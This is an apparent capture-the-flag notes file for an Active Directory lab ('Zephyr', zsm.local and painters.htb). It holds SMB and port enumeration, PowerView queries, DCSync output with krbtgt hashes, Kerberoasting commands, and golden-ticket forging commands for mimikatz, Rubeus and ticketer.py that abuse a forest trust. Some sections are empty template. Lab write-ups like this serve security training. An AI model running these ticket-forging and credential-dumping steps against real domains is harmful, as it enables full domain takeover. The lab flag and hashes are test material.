# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: 

# Findings
### Credentials
`FoundCREDs`


### flag
- `ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}`
## External
### Enumeration
```shell
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:False)


PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack ttl 64
88/tcp   open  kerberos-sec     syn-ack ttl 64
135/tcp  open  msrpc            syn-ack ttl 64
139/tcp  open  netbios-ssn      syn-ack ttl 64
389/tcp  open  ldap             syn-ack ttl 64
445/tcp  open  microsoft-ds     syn-ack ttl 64
464/tcp  open  kpasswd5         syn-ack ttl 64
636/tcp  open  ldapssl          syn-ack ttl 64
3268/tcp open  globalcatLDAP    syn-ack ttl 64
3269/tcp open  globalcatLDAPssl syn-ack ttl 64

~/C/H/P/z/I/DC01 > 10.10.17.103 $ smbclient -N -L \\\\192.168.210.10
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	NOTHINGGGGGGGGGGGGGGG


```
```

> Get-DomainComputer -Domain zsm.local -Properties DNSHostName

dnshostname
-----------
ZPH-SVRDC01.zsm.local
Maintenance.zsm.local
ZPH-GMSA-ADFS.zsm.local
ZPH-SVRCA01.zsm.local
ZPH-SVRADFS1.zsm.local
ZPH-SVRSQL01.zsm.local
ZPH-SVRMGMT1.zsm.local

```
![](https://i.imgur.com/mM1WkfP.png)
![](https://i.imgur.com/b7jqSFk.png)
```shell
PS C:\> get-domaintrust
get-domaintrust


SourceName      : painters.htb
TargetName      : zsm.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 28/03/2022 08:04:26
WhenChanged     : 27/06/2024 09:43:14
```
```powershell
PS C:\> Get-NetComputer -Domain zsm.local | Select-Object Name, IPv4Address
Get-NetComputer -Domain zsm.local | Select-Object Name, IPv4Address

name          IPv4Address
----          -----------
ZPH-SVRDC01
MAINTENANCE
ZPH-GMSA-ADFS
ZPH-SVRCA01
ZPH-SVRADFS1
ZPH-SVRSQL01
ZPH-SVRMGMT1
```
### Gaining Access
![](https://i.imgur.com/Cmmrwat.png)
![](https://i.imgur.com/mriudXR.png)


## Internal
### Enumeration
![](https://i.imgur.com/GDLLfwM.png)
[[ZPH - SVRCDC01]]
# EXTRA
Golden Ticket
1. KRBTGT: `b59ffc1f7fcd615577dab8436d3988fc`
2. SID: `S-1-5-21-1470357062-2280927533-300823338`
3. name: `hacker`
4. Enterprise SID: `S-1-5-21-2734290894-461713716-141835440-519`
5. FQDN: `PAINTERS.HTB`
- THE TICKET
```c
kerberos::golden /user:hacker /domain:PAINTERS.HTB /sid:S-1-5-21-1470357062-2280927533-300823338 /krbtgt:b59ffc1f7fcd615577dab8436d3988fc /sids:S-1-5-21-2734290894-461713716-141835440-519 /ptt

# It doesnt work with mimikatz, but it worked with rubues
.\Rubeus.exe golden /rc4:b59ffc1f7fcd615577dab8436d3988fc /domain:PAINTERS.HTB /sid:S-1-5-21-1470357062-2280927533-300823338  /sids:S-1-5-21-2734290894-461713716-141835440-519 /user:hacker /ptt


ticketer.py -nthash b59ffc1f7fcd615577dab8436d3988fc -domain PAINTERS.HTB -domain-sid S-1-5-21-1470357062-2280927533-300823338 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 hacker

python ticketer.py -nthash b59ffc1f7fcd615577dab8436d3988fc -domain-sid S-1-5-21-1470357062-2280927533-300823338 -domain PAINTERS.HTB abdutheman


mimikatz.exe "kerberos::golden /domain:PAINTERS.HTB /sid:S-1-5-21-1470357062-2280927533-300823338 /krbtgt:b59ffc1f7fcd615577dab8436d3988fc /user:hoperex /groups:513,2668 /ptt"


Get-DomainUser -Domain ZSM.LOCAL -Identity mssqlsvc |select samaccountname,memberof

.\Rubeus.exe kerberoast /domain:ZSM.LOCAL /nowrap
```
```powershell
mimikatz # lsadump::dcsync /user:krbtgt
[DC] 'painters.htb' will be the domain
[DC] 'DC.painters.htb' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 06/03/2022 17:18:53
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: b59ffc1f7fcd615577dab8436d3988fc
    ntlm- 0: b59ffc1f7fcd615577dab8436d3988fc
    lm  - 0: 4b5fa011e597d0bd3c8b9c4e73da61ee

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8426af1c75376b591bdfc1f8ab45c4a1

* Primary:Kerberos-Newer-Keys *
    Default Salt : PAINTERS.HTBkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
      aes128_hmac       (4096) : 9a6c9880f96f75edd17f648206fb5abd
      des_cbc_md5       (4096) : 25f2432654101f40

* Primary:Kerberos *
    Default Salt : PAINTERS.HTBkrbtgt
    Credentials
      des_cbc_md5       : 25f2432654101f40

* Packages *
    NTLM-Strong-NTOWF

PS C:\> Get-DomainSID
S-1-5-21-1470357062-2280927533-300823338

PS C:\> Get-DomainGroup -Domain ZSM.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                objectsid
-----------------                                ---------
CN=Enterprise Admins,CN=Users,DC=painters,DC=htb S-1-5-21-2734290894-461713716-141835440-519
```
![](https://i.imgur.com/LShaW3q.png)
![](https://i.imgur.com/GVMZn60.png)
![](https://i.imgur.com/f3EvQg9.png)

- Think the above is wrong
```
Get-DomainUser -SPN -Domain ZSM.LOCAL | select SamAccountName

lsadump::dcsync /user:ZSM\administrator /domain:ZSM.LOCAL

### Gaining Access


### Maintaining Access


# Random Notes